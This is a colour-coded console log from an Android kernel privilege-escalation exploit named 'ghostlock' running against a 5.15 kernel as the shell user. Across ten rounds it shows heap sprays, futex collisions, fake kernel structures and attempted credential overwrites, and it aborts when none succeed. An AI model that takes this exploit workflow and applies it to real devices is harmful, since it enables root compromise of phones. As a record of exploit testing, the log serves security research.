[33m[*] [0mkernel: 5.15.180-android13-8-00018-g9b2308ac0ad6-ab14563692
[32m[+] [0moffsets matched: 5.15.180-android13-8-00018-g9b2308ac0ad6-ab14563692 (layout nevada-5.15)
[32m[+] [0mstartup context pid=7771 uid=2000 euid=2000 gid=2000 egid=2000 attr=u:r:shell:s0 enforce=0
[32m[+] [0mstartup limits pid=7771 NoNewPrivs=0 Seccomp=0 Seccomp_filters=0
[32m[+] [0mbuild config pid=7771 label=ghostlock_nevada slide=pselect main=pselect
[32m[+] [0mp0 profile pid=7771 phys_offset=0000000040000000 kernel_phys_load=0000000040000000 delta=0000000000000000 slide_logger=ffffff8002b01e28 bootid_data=ffffff8002dc6819 init_task=ffffff8002c43640 root_tg=ffffff8002d58ac0 sysctl_bootid=ffffff8002dc6819
[33m[*] [0m[T+0ms] exploit start
[32m[+] [0mSELinux already off
[33m[*] [0m[T+4890ms] pre-W2 drain
[33m[*] [0mperf task: 0xffffff80aa345a00 (45/256 votes)
[33m[*] [0m[T+5080ms] perf_find_task done
[33m[*] [0mchild_pid=10008 child_task=0xffffff80aa345a00
[33m[*] [0mround 1/10: cred write
[33m[*] [0m=== W2: cred === target=0xffffff80aa346198 mode=2
[33m[*] [0m[T+9971ms]   heap spray start
[33m[*] [0mfutex_hashsize 2048 (8 possible CPUs)
[33m[*] [0mks collisions=3/3 baseline=4 threshold=10x (40) accepted=[15232..15736] slowest_rejected=5
[33m[*] [0mprepare_kernel_page ok attempt=1
[33m[*] [0m[T+15883ms]   heap spray done
[33m[*] [0mpselect route setup attempt=1 simple=0 shift=-2 page=ffffff80128e8000 fake_lock=ffffff80128e8000 fake_w0=ffffff80128e8300 fake_task=ffffff80128e8400 in0=0000000000000000 in3=0000000000000000 out0=0000000000000000 ex0=0000000000000000 ex1=0000000000000000 ex2=0000000000000000 ex3=0000000000000000
[33m[*] [0mpselect pre-select +0ms
[33m[*] [0mpselect post-select +200ms ret=0
[33m[*] [0mpselect returned attempt=1 ret=0 errno=0 calls=1 success=1 delay=0
[33m[*] [0mpselect route probing cfi attempt=1 ret=0 expected=9
[33m[*] [0mpselect route done calls=1 success=1 step=0 errno=0
[33m[*] [0m[T+17091ms]   PI route done
[33m[*] [0mchild uid = 2000
[33m[*] [0mround 2/10: cred write
[33m[*] [0m=== W2: cred === target=0xffffff80aa346198 mode=2
[33m[*] [0m[T+22783ms]   heap spray start
[33m[*] [0mfutex_hashsize 2048 (8 possible CPUs)
[33m[*] [0mks collisions=3/3 baseline=4 threshold=10x (40) accepted=[15434..16086] slowest_rejected=5
[33m[*] [0mprepare_kernel_page ok attempt=1
[33m[*] [0m[T+30118ms]   heap spray done
[33m[*] [0mpselect route setup attempt=1 simple=0 shift=-2 page=ffffff80041e8000 fake_lock=ffffff80041e8000 fake_w0=ffffff80041e8300 fake_task=ffffff80041e8400 in0=0000000000000000 in3=0000000000000000 out0=0000000000000000 ex0=0000000000000000 ex1=0000000000000000 ex2=0000000000000000 ex3=0000000000000000
[33m[*] [0mpselect pre-select +0ms
[33m[*] [0mpselect post-select +201ms ret=0
[33m[*] [0mpselect returned attempt=1 ret=0 errno=0 calls=1 success=0 delay=0
[33m[*] [0mpselect route done calls=1 success=0 step=33 errno=0
[33m[*] [0m[T+31332ms]   PI route done
[33m[*] [0mchild uid = 2000
[33m[*] [0mround 3/10: cred write
[33m[*] [0m=== W2: cred === target=0xffffff80aa346198 mode=2
[33m[*] [0m[T+38551ms]   heap spray start
[33m[*] [0mfutex_hashsize 2048 (8 possible CPUs)
[33m[*] [0mks collisions=3/3 baseline=4 threshold=10x (40) accepted=[15689..16240] slowest_rejected=5
[33m[*] [0mprepare_kernel_page ok attempt=1
[33m[*] [0m[T+46853ms]   heap spray done
[33m[*] [0mpselect route setup attempt=1 simple=0 shift=-2 page=ffffff80104e8000 fake_lock=ffffff80104e8000 fake_w0=ffffff80104e8300 fake_task=ffffff80104e8400 in0=0000000000000000 in3=0000000000000000 out0=0000000000000000 ex0=0000000000000000 ex1=0000000000000000 ex2=0000000000000000 ex3=0000000000000000
[33m[*] [0mpselect pre-select +0ms
[33m[*] [0mpselect post-select +202ms ret=0
[33m[*] [0mpselect returned attempt=1 ret=0 errno=0 calls=1 success=0 delay=0
[33m[*] [0mpselect route done calls=1 success=0 step=33 errno=0
[33m[*] [0m[T+48066ms]   PI route done
[33m[*] [0mchild uid = 2000
[33m[*] [0mround 4/10: cred write
[33m[*] [0m=== W2: cred === target=0xffffff80aa346198 mode=2
[33m[*] [0m[T+56940ms]   heap spray start
[33m[*] [0mfutex_hashsize 2048 (8 possible CPUs)
[33m[*] [0mks collisions=3/3 baseline=4 threshold=10x (40) accepted=[15209..15714] slowest_rejected=5
[33m[*] [0mprepare_kernel_page ok attempt=1
[33m[*] [0m[T+64856ms]   heap spray done
[33m[*] [0mpselect route setup attempt=1 simple=0 shift=-2 page=ffffff80174d8000 fake_lock=ffffff80174d8000 fake_w0=ffffff80174d8300 fake_task=ffffff80174d8400 in0=0000000000000000 in3=0000000000000000 out0=0000000000000000 ex0=0000000000000000 ex1=0000000000000000 ex2=0000000000000000 ex3=0000000000000000
[33m[*] [0mpselect pre-select +1ms
[33m[*] [0mpselect post-select +201ms ret=0
[33m[*] [0mpselect returned attempt=1 ret=0 errno=0 calls=1 success=0 delay=0
[33m[*] [0mpselect route done calls=1 success=0 step=33 errno=0
[33m[*] [0m[T+66065ms]   PI route done
[33m[*] [0mchild uid = 2000
[33m[*] [0mround 5/10: cred write
[33m[*] [0m=== W2: cred === target=0xffffff80aa346198 mode=2
[33m[*] [0m[T+74770ms]   heap spray start
[33m[*] [0mfutex_hashsize 2048 (8 possible CPUs)
[33m[*] [0mks collisions=3/3 baseline=4 threshold=10x (40) accepted=[15108..16047] slowest_rejected=5
[33m[*] [0mprepare_kernel_page ok attempt=1
[33m[*] [0m[T+84827ms]   heap spray done
[33m[*] [0mpselect route setup attempt=1 simple=0 shift=-2 page=ffffff80ad700000 fake_lock=ffffff80ad700000 fake_w0=ffffff80ad700300 fake_task=ffffff80ad700400 in0=0000000000000000 in3=0000000000000000 out0=0000000000000000 ex0=0000000000000000 ex1=0000000000000000 ex2=0000000000000000 ex3=0000000000000000
[33m[*] [0mpselect pre-select +0ms
[33m[*] [0mpselect post-select +201ms ret=0
[33m[*] [0mpselect returned attempt=1 ret=0 errno=0 calls=1 success=0 delay=0
[33m[*] [0mpselect route done calls=1 success=0 step=33 errno=0
[33m[*] [0m[T+86036ms]   PI route done
[33m[*] [0mchild uid = 2000
[33m[*] [0mround 6/10: cred write
[33m[*] [0m=== W2: cred === target=0xffffff80aa346198 mode=2
[33m[*] [0m[T+99434ms]   heap spray start
[33m[*] [0mfutex_hashsize 2048 (8 possible CPUs)
[33m[*] [0mks collisions=3/3 baseline=4 threshold=10x (40) accepted=[18780..18796] slowest_rejected=5
[33m[*] [0mprepare_kernel_page ok attempt=1
[33m[*] [0m[T+118946ms]   heap spray done
[33m[*] [0mpselect route setup attempt=1 simple=0 shift=-2 page=ffffff80d4330000 fake_lock=ffffff80d4330000 fake_w0=ffffff80d4330300 fake_task=ffffff80d4330400 in0=0000000000000000 in3=0000000000000000 out0=0000000000000000 ex0=0000000000000000 ex1=0000000000000000 ex2=0000000000000000 ex3=0000000000000000
[33m[*] [0mpselect pre-select +0ms
[33m[*] [0mpselect post-select +201ms ret=0
[33m[*] [0mpselect returned attempt=1 ret=0 errno=0 calls=1 success=0 delay=0
[33m[*] [0mpselect route done calls=1 success=0 step=33 errno=0
[33m[*] [0m[T+120153ms]   PI route done
[33m[*] [0mchild uid = 2000
[33m[*] [0mround 7/10: cred write
[33m[*] [0m=== W2: cred === target=0xffffff80aa346198 mode=2
[33m[*] [0m[T+131406ms]   heap spray start
[33m[*] [0mfutex_hashsize 2048 (8 possible CPUs)
[33m[*] [0mks collisions=3/3 baseline=4 threshold=10x (40) accepted=[16222..19140] slowest_rejected=5
[33m[*] [0mprepare_kernel_page ok attempt=1
[33m[*] [0m[T+142250ms]   heap spray done
[33m[*] [0mpselect route setup attempt=1 simple=0 shift=-2 page=ffffff8016098000 fake_lock=ffffff8016098000 fake_w0=ffffff8016098300 fake_task=ffffff8016098400 in0=0000000000000000 in3=0000000000000000 out0=0000000000000000 ex0=0000000000000000 ex1=0000000000000000 ex2=0000000000000000 ex3=0000000000000000
[33m[*] [0mpselect pre-select +0ms
[33m[*] [0mpselect post-select +201ms ret=0
[33m[*] [0mpselect returned attempt=1 ret=0 errno=0 calls=1 success=0 delay=0
[33m[*] [0mpselect route done calls=1 success=0 step=33 errno=0
[33m[*] [0m[T+143458ms]   PI route done
[33m[*] [0mchild uid = 2000
[33m[*] [0mround 8/10: cred write
[33m[*] [0m=== W2: cred === target=0xffffff80aa346198 mode=2
[33m[*] [0m[T+155637ms]   heap spray start
[33m[*] [0mfutex_hashsize 2048 (8 possible CPUs)
[33m[*] [0mks collisions=3/3 baseline=5 threshold=10x (50) accepted=[19078..33587] slowest_rejected=5
[33m[*] [0mprepare_kernel_page ok attempt=1
[33m[*] [0m[T+168660ms]   heap spray done
[33m[*] [0mpselect route setup attempt=1 simple=0 shift=-2 page=ffffff8021638000 fake_lock=ffffff8021638000 fake_w0=ffffff8021638300 fake_task=ffffff8021638400 in0=0000000000000000 in3=0000000000000000 out0=0000000000000000 ex0=0000000000000000 ex1=0000000000000000 ex2=0000000000000000 ex3=0000000000000000
[33m[*] [0mpselect pre-select +0ms
[33m[*] [0mpselect post-select +201ms ret=0
[33m[*] [0mpselect returned attempt=1 ret=0 errno=0 calls=1 success=0 delay=0
[33m[*] [0mpselect route done calls=1 success=0 step=33 errno=0
[33m[*] [0m[T+169867ms]   PI route done
[33m[*] [0mchild uid = 2000
[33m[*] [0mround 9/10: cred write
[33m[*] [0m=== W2: cred === target=0xffffff80aa346198 mode=2
[33m[*] [0m[T+183341ms]   heap spray start
[33m[*] [0mfutex_hashsize 2048 (8 possible CPUs)
[33m[*] [0mks collisions=3/3 baseline=4 threshold=10x (40) accepted=[15275..16213] slowest_rejected=5
[33m[*] [0mprepare_kernel_page ok attempt=1
[33m[*] [0m[T+196732ms]   heap spray done
[33m[*] [0mpselect route setup attempt=1 simple=0 shift=-2 page=ffffff8022070000 fake_lock=ffffff8022070000 fake_w0=ffffff8022070300 fake_task=ffffff8022070400 in0=0000000000000000 in3=0000000000000000 out0=0000000000000000 ex0=0000000000000000 ex1=0000000000000000 ex2=0000000000000000 ex3=0000000000000000
[33m[*] [0mpselect pre-select +0ms
[33m[*] [0mpselect post-select +201ms ret=0
[33m[*] [0mpselect returned attempt=1 ret=0 errno=0 calls=1 success=0 delay=0
[33m[*] [0mpselect route done calls=1 success=0 step=33 errno=0
[33m[*] [0m[T+197938ms]   PI route done
[33m[*] [0mchild uid = 2000
[33m[*] [0mround 10/10: cred write
[33m[*] [0m=== W2: cred === target=0xffffff80aa346198 mode=2
[33m[*] [0m[T+211026ms]   heap spray start
[33m[*] [0mfutex_hashsize 2048 (8 possible CPUs)
[33m[*] [0mks collisions=3/3 baseline=5 threshold=10x (50) accepted=[16130..19122] slowest_rejected=5
[33m[*] [0mprepare_kernel_page ok attempt=1
[33m[*] [0m[T+225954ms]   heap spray done
[33m[*] [0mpselect route setup attempt=1 simple=0 shift=-2 page=ffffff8026348000 fake_lock=ffffff8026348000 fake_w0=ffffff8026348300 fake_task=ffffff8026348400 in0=0000000000000000 in3=0000000000000000 out0=0000000000000000 ex0=0000000000000000 ex1=0000000000000000 ex2=0000000000000000 ex3=0000000000000000
[33m[*] [0mpselect pre-select +0ms
[33m[*] [0mpselect post-select +201ms ret=0
[33m[*] [0mpselect returned attempt=1 ret=0 errno=0 calls=1 success=0 delay=0
[33m[*] [0mpselect route done calls=1 success=0 step=33 errno=0
[33m[*] [0m[T+227161ms]   PI route done
[33m[*] [0mchild uid = 2000
[31m[-] [0mSELinux is left permissive -- reboot to restore enforcing
[31m[!] [0mfailed after 10 rounds
[!] ghostlock preload verdict: ABORTED -- see the last [!] line
